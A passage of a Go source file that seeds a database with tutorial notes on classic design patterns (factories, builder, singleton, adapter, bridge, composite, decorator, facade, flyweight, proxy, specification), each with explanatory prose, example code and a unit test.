AbstractFactory provides an interface for creating families of related objects.\ntype AbstractFactory interface {\n  CreateWater(volume float64) AbstractWater\n  CreateBottle(volume float64) AbstractBottle\n}\n// AbstractWater provides a water interface.\ntype AbstractWater interface {\n  GetVolume() float64\n}\n// AbstractBottle provides a bottle interface.\ntype AbstractBottle interface {\n  PourWater(water AbstractWater) // Bottle interacts with a water.\n  GetBottleVolume() float64\n  GetWaterVolume() float64\n}\n// CocaColaFactory implements AbstractFactory interface.\ntype CocaColaFactory struct {\n}\n// NewCocaColaFactory is the CocaColaFactory constructor.\nfunc NewCocaColaFactory() AbstractFactory {\n  return &CocaColaFactory{}\n}\n// CreateWater implementation.\nfunc (f *CocaColaFactory) CreateWater(volume float64) AbstractWater {\n  return &CocaColaWater{volume: volume}\n}\n// CreateBottle implementation.\nfunc (f *CocaColaFactory) CreateBottle(volume float64) AbstractBottle {\n  return &CocaColaBottle{volume: volume}\n}\n// CocaColaWater implements AbstractWater.\ntype CocaColaWater struct {\n  volume float64 // Volume of drink.\n}\n// GetVolume returns volume of drink.\nfunc (w *CocaColaWater) GetVolume() float64 {\n  return w.volume\n}\n// CocaColaBottle implements AbstractBottle.\ntype CocaColaBottle struct {\n  water  AbstractWater // Bottle must contain a drink.\n  volume float64       // Volume of bottle.\n}\n// PourWater pours water into a bottle.\nfunc (b *CocaColaBottle) PourWater(water AbstractWater) {\n  b.water = water\n}\n// GetBottleVolume returns volume of bottle.\nfunc (b *CocaColaBottle) GetBottleVolume() float64 {\n  return b.volume\n}\n// GetWaterVolume returns volume of water.\nfunc (b *CocaColaBottle) GetWaterVolume() float64 {\n  return b.water.GetVolume()\n}\n\nfunc TestAbstractFactory(t *testing.T) {\n  cocacolaFactory := NewCocaColaFactory()\n  cocacolaWater := cocacolaFactory.CreateWater(2.5)\n  cocacolaBottle := cocacolaFactory.CreateBottle(2.5)\n  cocacolaBottle.PourWater(cocacolaWater)\n  if cocacolaBottle.GetWaterVolume() != cocacolaBottle.GetBottleVolume() {\n    t.Errorf(\"Expect volume to %.1fL, but %.1fL\", cocacolaBottle.GetWaterVolume(), cocacolaBottle.GetBottleVolume())\n  }\n}")
	create(db, "Pattern Builder\n(tags: pattern builder)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Builder pattern is one of the object-level generative patterns.\n\nThe Builder pattern defines a step-by-step process for building a complex product. After the last part is built, the product can be used.\n\nIn the example of the Abstract Factory pattern, the example of two factories Coca-Cola and Percy was given. Take one factory, it produces a complex product with 4 parts (cap, bottle, label, drink) that must be applied in the right order. You cannot first take the lid, bottle, screw on the lid, and then try to pour a drink there. To implement an object, a bottle of Coca-Cola that is supplied to a client, we need a Builder pattern.\n\nIt is important to understand that a complex object is not necessarily an object that operates with several other objects in the sense of OOP. For example, we need to get a document consisting of a title, introduction, content and conclusion. Our document is a complex object. We will use the Builder pattern to create a unified document compilation order.\n\nRequired for implementation:\n\n1. Class Director, which will manage the builder and give him commands in the right order, and the builder will execute them;\n2. The base abstract class Builder, which describes the interface of the builder, the commands that he must execute;\n3. The ConcreteBuilder class, which implements the builder interface and interacts with a complex object;\n4. The class of the complex object Product.\n\npackage builder\n\n// Builder provides a builder interface.\ntype Builder interface {\n  MakeHeader(str string)\n  MakeBody(str string)\n  MakeFooter(str string)\n}\n// Director implements a manager\ntype Director struct {\n  builder Builder\n}\n// Construct tells the builder what to do and in what order.\nfunc (d *Director) Construct() {\n  d.builder.MakeHeader(\"Header\")\n  d.builder.MakeBody(\"Body\")\n  d.builder.MakeFooter(\"Footer\")\n}\n// ConcreteBuilder implements Builder interface.\ntype ConcreteBuilder struct {\n  product *Product\n}\n// MakeHeader builds a header of document..\nfunc (b *ConcreteBuilder) MakeHeader(str string) {\n  b.product.Content += \"<header>\" + str + \"</header>\"\n}\n// MakeBody builds a body of document.\nfunc (b *ConcreteBuilder) MakeBody(str string) {\n  b.product.Content += \"<article>\" + str + \"</article>\"\n}\n// MakeFooter builds a footer of document.\nfunc (b *ConcreteBuilder) MakeFooter(str string) {\n  b.product.Content += \"<footer>\" + str + \"</footer>\"\n}\n// Product implementation.\ntype Product struct {\n  Content string\n}\n// Show returns product.\nfunc (p *Product) Show() string {\n  return p.Content\n}\n\nfunc TestBuilder(t *testing.T) {\n  expect := \"<header>Header</header>\" +\n    \"<article>Body</article>\" +\n    \"<footer>Footer</footer>\"\n  product := new(Product)\n  director := Director{&ConcreteBuilder{product}}\n  director.Construct()\n  result := product.Show()\n  if result != expect {\n    t.Errorf(\"Expect result to %s, but %s\", result, expect)\n  }\n}")
	create(db, "Pattern Factory Method\n(tags: pattern factory method)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Factory Method pattern refers to class-level generative patterns and focuses only on relationships between classes.\n\nThe Factory Method pattern is useful when the system must remain easily extensible by adding new types of objects. This pattern is the basis for all generative patterns and can be easily transformed to suit the needs of the system. Therefore, if the developer is faced with unclear requirements for the product or the way of organizing interaction between products is not clear, then first you can use the Factory Method pattern until all the requirements are fully formed.\n\nThe Factory Method pattern is used to create objects with a specific interface, which are provided by descendants. In other words, there is a base abstract factory class that says that each inheriting factory must implement such and such a method to create its products.\n\nThe implementation of the factory method can be different, in most cases it depends on the implementation language. It can be polymorphism or a parameterized method.\n\nExample: We receive files of three extensions .txt, .png, .doc. Depending on the file extension, we have to save it in one of the directories / file / txt /, / file / png / and / file / doc /. This means that we will have a file factory with a parameterized factory method that accepts the path to a file that we need to store in one of the directories. This factory method returns an object to us, using which we can manipulate our file (save, see the type and directory for saving). Note that we do not specify in any way which instance of the product object we need to get, this is done by the factory method by determining the file extension and, based on it, choosing the appropriate product class. Thus, if our system expands and the available file extensions become, for example, 25, then we just need to change the factory method and implement the product classes.\n\nRequired for implementation:\n\n1. The basic abstract class Creator, which describes the interface that a specific factory must implement to produce products. This base class describes a factory method.\n2. The base Product class, which describes the product interface returned by the factory. All products returned by the factory must adhere to the same interface.\n3. The class of a specific factory for the production of ConcreteCreator products. This class must implement a factory method;\n4. Class of the real product ConcreteProductA;\n5. The class of the real product ConcreteProductB;\n6. The class of the real product ConcreteProductC.\n\nFactory Method differs from Abstract Factory in that Abstract Factory produces a family of objects, these objects are different, have different interfaces, but interact with each other. While Factory Method produces products that adhere to the same interface and these products are not interconnected, they do not interact.\n\npackage factory_method\n\nimport \"log\"\n\n// Creater provides a factory interface.\ntype Creater interface {\n  CreateProduct(action string) Producter // Factory Method\n}\n// Producter provides a product interface.\n// All products returned by factory must provide a single interface.\ntype Producter interface {\n  Use() string // Every product should be can be used\n}\n// ConcreteCreater implements Creater interface.\ntype ConcreteCreater struct {\n}\n// NewCreater is the ConcreteCreater constructor.\nfunc NewCreater() Creater {\n  return &ConcreteCreater{}\n}\n// CreateProduct is a Factory Method\nfunc (p *ConcreteCreater) CreateProduct(action string) Producter {\n  var product Producter\n  switch action {\n  case \"A\":\n    product = &ConcreteProductA{action}\n  case \"B\":\n    product = &ConcreteProductB{action}\n  case \"C\":\n    product = &ConcreteProductC{action}\n  default:\n    log.Fatalln(\"Unknown Action\")\n  }\n  return product\n}\n// ConcreteProductA implements product \"A\"\ntype ConcreteProductA struct {\n  action string\n}\n// Use returns product action\nfunc (p *ConcreteProductA) Use() string {\n  return p.action\n}\n// ConcreteProductB implements product \"B\"\ntype ConcreteProductB struct {\n  action string\n}\n// Use returns product action\nfunc (p *ConcreteProductB) Use() string {\n  return p.action\n}\n// ConcreteProductC implements product \"C\"\ntype ConcreteProductC struct {\n  action string\n}\n// Use returns product action\nfunc (p *ConcreteProductC) Use() string {\n  return p.action\n}\n\nfunc TestFactoryMethod(t *testing.T) {\n  assert := []string{\"A\", \"B\", \"C\"}\n  factory := NewCreater()\n  products := []Producter{\n    factory.CreateProduct(\"A\"),\n    factory.CreateProduct(\"B\"),\n    factory.CreateProduct(\"C\"),\n  }\n  for i, product := range products {\n    if action := product.Use(); action != assert[i] {\n      t.Errorf(\"Expect action to %s, but %s.\\n\", assert[i], action)\n    }\n  }\n}")
	create(db, "Pattern Prototype\n(tags: pattern prototype)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Prototype pattern is an object-level procreative pattern.\n\nThe Prototype pattern allows you to create new objects by copying (cloning) a previously created original product object (prototype).\n\nThe pattern describes the process of creating clone objects based on an existing prototype object, in other words, the Prototype pattern describes how the cloning process is organized.\n\nRequired for implementation:\n\n1. The base class Prototype, which declares the cloning interface. All its inheriting classes must implement this cloning mechanism;\n2. The ConcretePrototypeA product class that must implement this prototype;\n3. The ConcretePrototypeB product class that must implement this prototype.\n\nUsually the cloning operation occurs through the clone () method, which is described in the base class and must be implemented by each product.\n\npackage prototype\n\n// Prototyper provides a cloning interface.\ntype Prototyper interface {\n  Clone() Prototyper\n  GetName() string\n}\n// ConcreteProduct implements product \"A\"\ntype ConcreteProduct struct {\n  name string // Имя продукта\n}\n// NewConcreteProduct is the Prototyper constructor.\nfunc NewConcreteProduct(name string) Prototyper {\n  return &ConcreteProduct{\n    name: name,\n  }\n}\n// GetName returns product name\nfunc (p *ConcreteProduct) GetName() string {\n  return p.name\n}\n// Clone returns a cloned object.\nfunc (p *ConcreteProduct) Clone() Prototyper {\n  return &ConcreteProduct{p.name}\n}\n\nfunc TestPrototype(t *testing.T) {\n  product := NewConcreteProduct(\"A\")\n  cloneProduct := product.Clone()\n  if cloneProduct.GetName() != product.GetName() {\n    t.Error(\"Expect name \\\"A\\\" to equal, but not equal.\")\n  }\n}")
	create(db, "Pattern Singleton\n(tags: pattern singleton)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Singleton pattern is an object-level ancestor pattern.\nThe pattern controls the creation of a single instance of a certain class and provides access to it.\nIn other words, Singleton ensures that the class has only one instance and provides an access point to it through a factory method.\n\nRequired for implementation:\n\n1. The GetInstance function, which creates an instance of the Singleton class only once. If an instance has already been created before, then it simply returns this instance.\n\npackage singleton\n\nimport \"sync\"\n\n// Singleton implementation.\ntype Singleton struct {\n}\nvar (\n  instance *Singleton\n  once     sync.Once\n)\n// GetInstance returns singleton\nfunc GetInstance() *Singleton {\n  once.Do(func() {\n    instance = &Singleton{}\n  })\n  return instance\n}\n\nfunc TestSingleton(t *testing.T) {\n  instance1 := GetInstance()\n  instance2 := GetInstance()\n  if instance1 != instance2 {\n    t.Error(\"Objects are not equal!\\n\")\n  }\n}")
	create(db, "Pattern Adapter\n(tags: pattern adapter)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Adapter pattern is a class-level structural pattern.\n\nOften in a new project, developers want to reuse existing code. For example, existing classes may have the desired functionality and yet have incompatible interfaces. In such cases, the Adapter pattern should be used.\n\nThe meaning of this pattern is that if you have a class and its interface is not compatible with the code of your system, then in order to resolve this conflict, we do not change the code of this class, but write an adapter for it. In other words, Adapter adapts existing code to the required interface (it is an adapter).\n\nRequired for implementation:\n\n1. Target interface, describing the target interface (the interface with which our system would like to work);\n2. The Adaptee class, which our system must adapt for itself;\n3. An Adapter class, an adapter that implements the target interface.\n\npackage adapter\n\n// Target provides an interface with which the system should work.\ntype Target interface {\n  Request() string\n}\n// Adaptee implements system to be adapted.\ntype Adaptee struct {\n}\n// NewAdapter is the Adapter constructor.\nfunc NewAdapter(adaptee *Adaptee) Target {\n  return &Adapter{adaptee}\n}\n// SpecificRequest implementation.\nfunc (a *Adaptee) SpecificRequest() string {\n  return \"Request\"\n}\n// Adapter implements Target interface and is an adapter.\ntype Adapter struct {\n  *Adaptee\n}\n// Request is an adaptive method.\nfunc (a *Adapter) Request() string {\n  return a.SpecificRequest()\n}\n\nfunc TestAdapter(t *testing.T) {\n  adapter := NewAdapter(&Adaptee{})\n  req := adapter.Request()\n  if req != \"Request\" {\n    t.Errorf(\"Expect volume to %s, but %s\", \"Request\", req)\n  }\n}")
	create(db, "Pattern Bridge\n(tags: pattern bridge)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Bridge pattern refers to object-level structural patterns.\n\nThe Bridge pattern allows you to separate an object into abstraction and implementation so that they can change independently of each other.\n\nIf several implementations are possible for one abstraction, then inheritance is usually used. However, this approach is not always convenient, since inheritance tightly ties the implementation to the abstraction, which makes it difficult to independently modify and complicate their reuse.\n\nThe pattern should be used when we have an abstraction and several implementations of it. Of course, it makes no sense to separate the abstraction from the implementation if there can be only one implementation.\n\nI have not found any adequate description of the \"Bridge\" pattern. Everything that I have come across is either not true and examples are sucked from the finger or very blurry. From what I understand and can explain on my fingers - the Bridge is a tricky aggregation. The class that implements the product, implements the interface of the aggregated class, which is slipped at the stage of creating an instance of the product class.\n\nAs I understand it ... we have 3 cars and 3 different engines. Every engine fits every machine, i.e. it implements its interface. If we do this by inheritance, we get 9 different classes. It turns out that each vehicle has 3 modifications. This is inconvenient, so we will slip the engine at the stage of creating the car. Also, each engine can run on a different fuel, diesel or gasoline, so as not to produce 6 different implementations, when creating an engine, we will slip the type of fuel into it.\n\nTo implement the pattern in this example, you need to add a field in the base car class to store a pointer to the implementation type, the value of which the class will receive in its constructor, and call the methods of the nested object, if necessary.\n\nRequired for implementation:\n\n1. Base abstract class (in our case, describing a car);\n2. A class that implements the base class. It has a property in which we will slip the pointer to the engine used (the car can work with any of the presented engines);\n3. Abstraction of the engine;\n4. Realization of the engine.\n\nIn general, the property storing a pointer to the used object is a bridge. We can slip different objects into it, the main thing is that they have the same interface.\n\npackage bridge\n\n// Carer provides car interface.\ntype Carer interface {\n  Rase() string\n}\n// Enginer provides engine interface.\ntype Enginer interface {\n  GetSound() string\n}\n// Car implementation.\ntype Car struct {\n  engine Enginer\n}\n// NewCar is the Car constructor.\nfunc NewCar(engine Enginer) Carer {\n  return &Car{\n    engine: engine,\n  }\n}\n// Rase implementation.\nfunc (c *Car) Rase() string {\n  return c.engine.GetSound()\n}\n// EngineSuzuki implements Suzuki engine.\ntype EngineSuzuki struct {\n}\n// GetSound returns sound of the engine.\nfunc (e *EngineSuzuki) GetSound() string {\n  return \"SssuuuuZzzuuuuKkiiiii\"\n}\n// EngineHonda implements Honda engine.\ntype EngineHonda struct {\n}\n// GetSound returns sound of the engine.\nfunc (e *EngineHonda) GetSound() string {\n  return \"HhoooNnnnnnnnnDddaaaaaaa\"\n}\n// EngineLada implements Lada engine.\ntype EngineLada struct {\n}\n// GetSound returns sound of the engine.\nfunc (e *EngineLada) GetSound() string {\n  return \"PhhhhPhhhhPhPhPhPhPh\"\n}\n\nfunc TestBridge(t *testing.T) {\n  expect := \"SssuuuuZzzuuuuKkiiiii\"\n  car := NewCar(&EngineSuzuki{})\n  sound := car.Rase()\n  if sound != expect {\n    t.Errorf(\"Expect sound to %s, but %s\", expect, sound)\n  }\n}")
	create(db, "Pattern Composite\n(tags: pattern composite)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Composite pattern refers to object-level structural patterns.\n\nThe Composite pattern groups similar objects into tree structures.\n\nArrays representing the branches of the tree will be used to build the tree.\n\nRequired for implementation:\n\n1. Basic abstract class Component which provides an interface for both branches and leaves of a tree;\n2. The Composite class that implements the Component interface and is a branch of the tree;\n3. The Leaf class, which implements the Component interface and is a leaf of the tree.\n\nNote that a leaf in a tree is a leaf node class and cannot have descendants (a branch or other leaf cannot grow from a leaf).\n\nBranches of a tree define the behavior of objects included in the tree structure, which have descendants, and also store the components of the tree themselves. In other words, branches can contain other branches and leaves.\n\nThe main purpose of the pattern is to provide a single interface to both the composite (branch) and the final (leaf) object, so that the client does not think about which object he is working with.\n\npackage composite\n\n// Component provides an interface for branches and leaves of a tree.\ntype Component interface {\n  Add(child Component)\n  Name() string\n  Child() []Component\n  Print(prefix string) string\n}\n// Directory implements branches of a tree\ntype Directory struct {\n  name   string\n  childs []Component\n}\n// Add appends an element to the tree branch.\nfunc (d *Directory) Add(child Component) {\n  d.childs = append(d.childs, child)\n}\n// Name returns name of the Component.\nfunc (d *Directory) Name() string {\n  return d.name\n}\n// Child returns child elements.\nfunc (d *Directory) Child() []Component {\n  return d.childs\n}\n// Print returns the branche in string representation.\nfunc (d *Directory) Print(prefix string) string {\n  result := prefix + \"/\" + d.Name() + \"\\n\"\n  for _, val := range d.Child() {\n    result += val.Print(prefix + \"/\" + d.Name())\n  }\n  return result\n}\n// File implements a leaves of a tree\ntype File struct {\n  name string\n}\n// Add implementation.\nfunc (f *File) Add(child Component) {\n}\n// Name returns name of the Component.\nfunc (f *File) Name() string {\n  return f.name\n}\n// Child implementation.\nfunc (f *File) Child() []Component {\n  return []Component{}\n}\n// Print returns the leave in string representation.\nfunc (f *File) Print(prefix string) string {\n  return prefix + \"/\" + f.Name() + \"\\n\"\n}\n// NewDirectory is constructor.\nfunc NewDirectory(name string) *Directory {\n  return &Directory{\n    name: name,\n  }\n}\n// NewFile is constructor.\nfunc NewFile(name string) *File {\n  return &File{\n    name: name,\n  }\n}\n\nfunc TestComposite(t *testing.T) {\n  expect := \"/root\\n/root/usr\\n/root/usr/B\\n/root/A\\n\"\n  rootDir := NewDirectory(\"root\")\n  usrDir := NewDirectory(\"usr\")\n  fileA := NewFile(\"A\")\n  rootDir.Add(usrDir)\n  rootDir.Add(fileA)\n  fileB := NewFile(\"B\")\n  usrDir.Add(fileB)\n  result := rootDir.Print(\"\")\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Decorator\n(tags: pattern decorator)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nDecorator pattern refers to object-level structural patterns.\n\nThe Decorator pattern is used to extend the functionality of objects by dynamically adding new capabilities to an object. When implementing the pattern, the composition relation is used.\n\nThe essence of the decorator's work is to wrap the finished object with new functionality, while the entire original interface of the object remains accessible, by sending the decorator of all requests to the wrapped object.\n\nRequired for implementation:\n\n1. The base abstract class Component which provides an interface for the decorator and component classes;\n2. The ConcreteDecorator class, which implements the Component interface and reloads all methods of the component; if necessary, functionality is added to them;\n3. The ConcreteComponent class implements the Component interface and will be wrapped with a decorator.\n\nWith such a structure, it doesn't matter to us whether the component is a decorator or a concrete implementation, since they have the same interface, and we can make decorator chains. Thus, dynamically change the state and behavior of the object.\n\nI heard the example with Carlson and I really liked it. We have Carlson, we put a jumpsuit on him, thereby changing his state, then we put a propeller on his pants, thereby changing his behavior. The propeller can be removed, depending on the situation, by changing the behavior to the opposite, or you can wear a different overalls with different properties.\n\npackage decorator\n\n// Component provides an interface for a decorator and component.\ntype Component interface {\n  Operation() string\n}\n// ConcreteComponent implements a component.\ntype ConcreteComponent struct {\n}\n// Operation implementation.\nfunc (c *ConcreteComponent) Operation() string {\n  return \"I am component!\"\n}\n// ConcreteDecorator implements a decorator.\ntype ConcreteDecorator struct {\n  component Component\n}\n// Operation wraps operation of component\nfunc (d *ConcreteDecorator) Operation() string {\n  return \"<strong>\" + d.component.Operation() + \"</strong>\"\n}\n\nfunc TestDecorator(t *testing.T) {\n  expect := \"<strong>I am component!</strong>\"\n  decorator := &ConcreteDecorator{&ConcreteComponent{}}\n  result := decorator.Operation()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Facade\n(tags: pattern facade)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Facade pattern refers to object-level structural patterns.\n\nThe Facade pattern provides a high-level unified interface in the form of a set of method names to a set of related classes or objects of a subsystem, which makes it easier to use.\n\nDividing a complex system into subsystems simplifies the development process, and also helps to minimize the dependence of one subsystem on another. However, using such subsystems becomes quite difficult. One way to solve this problem is the Facade pattern. Our task is to make a simple, unified interface through which one could interact with subsystems.\n\nAn example is the car interface. Modern cars have a unified driver interface that hides a complex subsystem. Thanks to the use of sophisticated electronics that do most of the work for the driver, he can easily drive a car without thinking about how everything works there.\n\nRequired for implementation:\n\n1. The Facade class provides unified access for the subsystem classes;\n2. Subsystem class SubSystemA;\n3. Subsystem class SubSystemB;\n4. Subsystem class SubSystemC.\n\nNote that the facade is not the only point of access to the subsystem, nor does it limit the capabilities that might be needed by \"advanced\" users who want to work directly with the subsystem.\n\npackage facade\n\nimport \"strings\"\n\n// NewMan creates man.\nfunc NewMan() *Man {\n  return &Man{\n    house: &House{},\n    tree:  &Tree{},\n    child: &Child{},\n  }\n}\n// Man implements man and facade.\ntype Man struct {\n  house *House\n  tree  *Tree\n  child *Child\n}\n// Todo returns that man must do.\nfunc (m *Man) Todo() string {\n  result := []string{\n    m.house.Build(),\n    m.tree.Grow(),\n    m.child.Born(),\n  }\n  return strings.Join(result, \"\\n\")\n}\n// House implements a subsystem \"House\"\ntype House struct {\n}\n// Build implementation.\nfunc (h *House) Build() string {\n  return \"Build house\"\n}\n// Tree implements a subsystem \"Tree\"\ntype Tree struct {\n}\n// Grow implementation.\nfunc (t *Tree) Grow() string {\n  return \"Tree grow\"\n}\n// Child implements a subsystem \"Child\"\ntype Child struct {\n}\n// Born implementation.\nfunc (c *Child) Born() string {\n  return \"Child born\"\n}\n\nfunc TestFacade(t *testing.T) {\n  expect := \"Build house\\nTree grow\\nChild born\"\n  man := NewMan()\n  result := man.Todo()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Flyweight\n(tags: pattern flyweight)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Flyweight pattern refers to object-level structural patterns.\n\nThe Flyweight pattern is used to efficiently support a large number of small objects, it allows you to reuse small objects in different contexts.\n\nRequired for implementation:\n\n1. The FlyweightFactory class, which is a modified factory pattern for creating flyweight;\n2. Base abstract class Flyweight, to describe the general interface of flyweight;\n3. The ConcreteFlyweight class implements a flyweight that will replace the same small objects.\n\nThe bottom line is that we can request opportunists from the factory upon request, in turn, it will return those objects that have already been created, or create new ones. This means that we will use the already created objects, and not create even more, if the objects for ours already exist.\n\npackage flyweight\n\n// Flyweighter interface\ntype Flyweighter interface {\n  GetName() string\n  SetName(name string)\n}\n// FlyweightFactory implements a factory.\n// If a suitable flyweighter is in pool, then returns it.\ntype FlyweightFactory struct {\n  pool map[int]Flyweighter\n}\n// GetFlyweight creates or returns a suitable Flyweighter by state.\nfunc (f *FlyweightFactory) GetFlyweight(state int) Flyweighter {\n  if f.pool == nil {\n    f.pool = make(map[int]Flyweighter)\n  }\n  if _, ok := f.pool[state]; !ok {\n    f.pool[state] = &ConcreteFlyweight{state: state}\n  }\n  return f.pool[state]\n}\n// ConcreteFlyweight implements a Flyweighter interface.\ntype ConcreteFlyweight struct {\n  state int\n  name  string\n}\n// GetName returns name\nfunc (f *ConcreteFlyweight) GetName() string {\n  return \"My name: \" + f.name\n}\n// SetName sets a name\nfunc (f *ConcreteFlyweight) SetName(name string) {\n  f.name = name\n}\n\nfunc TestFlyweight(t *testing.T) {\n  expect := \"My name: Jeck\"\n  factory := new(FlyweightFactory)\n  flyweight1 := factory.GetFlyweight(1)\n  flyweight2 := factory.GetFlyweight(2)\n  flyweight3 := factory.GetFlyweight(3)\n  flyweight1.SetName(\"Jim\")\n  flyweight2.SetName(\"Jeck\")\n  flyweight3.SetName(\"Jill\")\n  flyweightN := factory.GetFlyweight(2)\n  result := flyweightN.GetName()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Proxy\n(tags: pattern proxy)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Proxy pattern refers to object-level structural patterns.\n\nThe Proxy pattern provides an object to control access to another object.\n\nAnother name for the pattern is \"Surrogate\". In this sense, it is an item or product that replaces any other item or product with which the surrogate has only some common properties, but it does not have all the qualities of the original item or product.\n\nThe Proxy pattern puts forward a number of important requirements, namely that the original object and its surrogate must interact with each other, and there must also be a possibility of replacing the original object, a surrogate at the place of its use, respectively, the interaction interfaces of the original object and its surrogate must coincide.\n\nIt will be easier for you to understand the pattern if you've watched the movie \"Surrogates\".\n\nRequired for implementation:\n\n1. Interface Subject, which is a common interface for a real object and its surrogate;\n2. The RealSubject class that implements the real object;\n3. The Proxy class that implements the surrogate object. Stores a reference to the real object, which allows the proxy to access the real object directly;\n\nFor example, the Proxy pattern can be used if we need to manage resource-intensive objects, but we don't want to instantiate such objects until they are actually used.\n\nYou might think this is the same as Adapter or Decorator. But...\n\nProxy provides the same interface to its object.\nAdapter provides a different interface.\nDecorator provides an advanced interface.\n\npackage proxy\n\n// Subject provides an interface for a real subject and its surrogate.\ntype Subject interface {\n  Send() string\n}\n// Proxy implements a surrogate.\ntype Proxy struct {\n  realSubject Subject\n}\n// Send sends a message\nfunc (p *Proxy) Send() string {\n  if p.realSubject == nil {\n    p.realSubject = &RealSubject{}\n  }\n  return \"<strong>\" + p.realSubject.Send() + \"</strong>\"\n}\n// RealSubject implements a real subject\ntype RealSubject struct {\n}\n// Send sends a message\nfunc (s *RealSubject) Send() string {\n  return \"I’ll be back!\"\n}\n\nfunc TestProxy(t *testing.T) {\n  expect := \"<strong>I’ll be back!</strong>\"\n  proxy := new(Proxy)\n  result := proxy.Send()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Specification\n(tags: pattern specification)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nA specification is a design pattern by which a business logic rule representation can be transformed into a chain of objects linked by Boolean logic operations.\n\n// Pattern Specification\n//\n// In the following example, we are retrieving invoices and sending them to a collection agency if\n//  1. they are overdue,\n//  2. notices have been sent, and\n//  3. they are not already with the collection agency.\n// This example is meant to show the end result of how the logic is 'chained' together.\n//\n// This usage example assumes a previously defined OverdueSpecification class\n// that is satisfied when an invoice's due date is 30 days or older,\n// a NoticeSentSpecification class that is satisfied when three notices\n// have been sent to the customer, and an InCollectionSpecification class\n// that is satisfied when an invoice has already been sent to the collection\n// agency. The implementation of these classes isn't important here.\n\npackage specification\n\n// Data for analysis\ntype Invoice struct {\n  Day    int\n  Notice int\n  IsSent bool\n}\n/////\n// Invoice Specification Interface\ntype Specification interface {\n  IsSatisfiedBy(Invoice) bool\n  And(Specification) Specification\n  Or(Specification) Specification\n  Not() Specification\n  Relate(Specification)\n}\n/////\n// Invoice BaseSpecification\ntype BaseSpecification struct {\n  Specification\n}\n// Check specification\nfunc (self *BaseSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return false\n}\n// Condition AND\nfunc (self *BaseSpecification) And(spec Specification) Specification {\n  a := &AndSpecification{\n    self.Specification, spec,\n  }\n  a.Relate(a)\n  return a\n}\n// Condition OR\nfunc (self *BaseSpecification) Or(spec Specification) Specification {\n  a := &OrSpecification{\n    self.Specification, spec,\n  }\n  a.Relate(a)\n  return a\n}\n// Condition NOT\nfunc (self *BaseSpecification) Not() Specification {\n  a := &NotSpecification{\n    self.Specification,\n  }\n  a.Relate(a)\n  return a\n}\n// Relate to specification\nfunc (self *BaseSpecification) Relate(spec Specification) {\n  self.Specification = spec\n}\n/////\n// AndSpecification\ntype AndSpecification struct {\n  Specification\n  compare Specification\n}\n// Check specification\nfunc (self *AndSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return self.Specification.IsSatisfiedBy(elm) && self.compare.IsSatisfiedBy(elm)\n}\n/////\n// OrSpecification\ntype OrSpecification struct {\n  Specification\n  compare Specification\n}\n// Check specification\nfunc (self *OrSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return self.Specification.IsSatisfiedBy(elm) || self.compare.IsSatisfiedBy(elm)\n}\n/////\n// NotSpecification\ntype NotSpecification struct {\n  Specification\n}\n// Check specification\nfunc (self *NotSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return !self.Specification.IsSatisfiedBy(elm)\n}\n/////\n// Invoice's due date is 30 days or older\ntype OverDueSpecification struct {\n  Specification\n}\n// Check specification\nfunc (self *OverDueSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return elm.Day >= 30\n}\n// Constructor\nfunc NewOverDueSpecification() Specification {\n  a := &OverDueSpecification{&BaseSpecification{}}\n  a.Relate(a)\n  return a\n}\n// Three notices have been sent to the customer\ntype NoticeSentSpecification struct {\n  Specification\n}\n// Check specification\nfunc (self *NoticeSentSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return elm.Notice >= 3\n}\n// Constructor\nfunc NewNoticeSentSpecification() Specification {\n  a := &NoticeSentSpecification{&BaseSpecification{}}\n  a.Relate(a)\n  return a\n}\n// Invoice has already been sent to the collection agency.\ntype InCollectionSpecification struct {\n  Specification\n}\n// Check specification\nfunc (self *InCollectionSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return !elm.IsSent\n}\n// Constructor\nfunc NewInCollectionSpecification() Specification {\n  a := &InCollectionSpecification{&BaseSpecification{}}\n  a.Relate(a)\n  return a\n}\n\nfunc TestSpecification(t *testing.T) {\n  overDue := NewOverDueSpecification()\n  noticeSent := NewNoticeSentSpecification()\n  inCollection := NewInCollectionSpecification()\n  sendToCollection := overDue.And(noticeSent).And(inCollection.Not())\n  invoice := Invoice{\n    Day:    31,    // >= 30\n    Notice: 4,     // >= 3\n    IsSent: false, // false\n  }\n  // true!\n  result := sendToCollection.IsSatisfiedBy(invoice)\n  if !result {\n    t.Errorf(\"Expect result to equal %v, but %v.\\n\", false, true)\n  }\n}")
